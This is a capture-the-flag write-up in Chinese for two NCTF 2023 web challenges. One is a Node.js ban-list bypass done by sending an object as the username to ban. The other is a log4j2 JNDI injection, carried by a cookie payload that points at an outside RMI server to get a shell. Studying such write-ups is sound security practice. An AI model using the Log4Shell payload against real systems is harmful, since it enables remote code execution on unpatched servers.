---
title: NCTF 2023 Writeup
date: 2023-12-25T16:01:54+08:00
tags: [CTF]
---

## Web

### Wait What?

> 这怎么可能呢？

```javascript

const express = require('express');
const child_process = require('child_process')
const app = express()
app.use(express.json())
const port = 80

function escapeRegExp(string) {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

let users = {
    "admin": "admin",
    "user": "user",
    "guest": "guest",
    'hacker':'hacker'
}

let banned_users = ['hacker']

// 你不准getflag
banned_users.push("admin")

let banned_users_regex = null;
function build_banned_users_regex() {
	let regex_string = ""
    for (let username of banned_users) {
        regex_string += "^" + escapeRegExp(username) + "$" + "|"
    }
    regex_string = regex_string.substring(0, regex_string.length - 1)
    banned_users_regex = new RegExp(regex_string, "g")
}

//鉴权中间件
function requireLogin(req, res, next) {
    let username = req.body.username
    let password = req.body.password
    if (!username || !password) {
        res.send("用户名或密码不能为空")
        return
    }
    if (typeof username !== "string" || typeof password !== "string") {
        res.send("用户名或密码不合法")
        return
    }
    // 基于正则技术的封禁用户匹配系统的设计与实现
    let test1 = banned_users_regex.test(username)
    console.log(`使用正则${banned_users_regex}匹配${username}的结果为：${test1}`)
    if (test1) {
		console.log("第一个判断匹配到封禁用户：",username)
        res.send("用户'"+username + "'被封禁，无法鉴权！")
        return
    }
    // 基于in关键字的封禁用户匹配系统的设计与实现
    let test2 = (username in banned_users)
    console.log(`使用in关键字匹配${username}的结果为：${test2}`)
    if (test2){
        console.log("第二个判断匹配到封禁用户：",username)
        res.send("用户'"+username + "'被封禁，无法鉴权！")
        return
    }
    if (username in users && users[username] === password) {
        next()
        return
    }
    res.send("用户名或密码错误，鉴权失败！")
}

function registerUser(username, password) {
    if (typeof username !== "string" || username.length > 20) {
        return "用户名不合法"
    }
    if (typeof password !== "string" || password.length > 20) {
        return "密码不合法"
    }
    if (username in users) {
        return "用户已存在"
    }

    for(let existing_user in users){
        let existing_user_password = users[existing_user]
        if (existing_user_password === password){
            return `您的密码已经被用户'${existing_user}'使用了，请使用其它的密码`
        }
    }

    users[username] = password
    return "注册成功"
}

app.use(express.static('public'))

// 每次请求前，更新封禁用户正则信息
app.use(function (req, res, next) {
    try {
        build_banned_users_regex()
		console.log("封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：",banned_users_regex)
    } catch (e) {
    }
    next()
})

app.post("/api/register", (req, res) => {
    let username = req.body.username
    let password = req.body.password
    let message = registerUser(username, password)
    res.send(message)
})

app.post("/api/login", requireLogin, (req, res) => {
    res.send("登录成功！")
})

app.post("/api/flag", requireLogin, (req, res) => {
    let username = req.body.username
    if (username !== "admin") {
        res.send("登录成功，但是只有'admin'用户可以看到flag，你的用户名是'" + username + "'")
        return
    }
    let flag = child_process.execSync("cat flag").toString()
    res.end(flag)
    console.error("有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！")
    res.on("finish", () => {
        setTimeout(() => { process.exit(0) }, 1)
    })
    return
})

app.post('/api/ban_user', requireLogin, (req, res) => {
    let username = req.body.username
    let ban_username = req.body.ban_username
    if(!ban_username){
        res.send("ban_username不能为空")
        return
    }
    if(username === ban_username){
        res.send("不能封禁自己")
        return
    }
    for (let name of banned_users){
        if (name === ban_username) {
            res.send("用户已经被封禁")
            return
        }
    }
    banned_users.push(ban_username)
    res.send("封禁成功！")
})



app.get("/", (req, res) => {
    res.redirect("/static/index.html")
})

app.listen(port, () => {
    console.log(`listening on port ${port}`)
})
```

需要使用 admin 用户才能得到 flag，但是 admin 用户被封禁了。for in 检查的是对象的 key，对于数组则是检测数组的下标，所以 for in 的封禁实现无法封禁 admin。生成正则表达式时做了转义处理，不太可能对正则表达式进行处理。猜测可以利用正则表达式的 lastIndex 特性，让正则表达式判断两次 admin 从而绕过检测。但是每次登陆时会重新生成正则表达式，无法正常让 lastIndex 增加。

发现 ban_user 的 API 没用做数据合法性检查。可以传入一个 Object，之后构建正则表达式的 for of 语句就会报错，从而无法更新正则表达式。

```json
{
    "username": "user",
    "password": "user",
    "ban_username": {
        "a": 1
    }
}
```

之后以 admin 身份重复请求两次 getflag 即可得到 flag。

### logging

> Welcome to NCTF 2023 Sign In!
> Where is my log? (Service restarts every 15 minutes)

根据题目意思和附件内容可以发现，需要利用 log4j2 漏洞。

Spring 在遇到 cookie 内包含中文时，会打印第一个请求的 cookie 内容。可以在 cookie 内夹带 payload。

使用 JNDI-Injection-Exploit 创建 JNDI 服务器。在这里需要选择 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath) 的 rmi 地址。

```http
GET / HTTP/1.1
User-Agent: PostmanRuntime/7.36.0
Accept: */*
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: 这是什么=${jndi:rmi://example.com:1099/3k20sl}
```

发送后即可得到 shell 地址。中间需要注意有些校园网封禁了带有 jndi 的数据包和 dnslog 等回显平台，测试的时候需要仔细排查才能复现成功。此外，因为只会打印第一次的 cookie 值，所以每次发送 payload 后需要等题目环境重置后才能再次发送 payload。
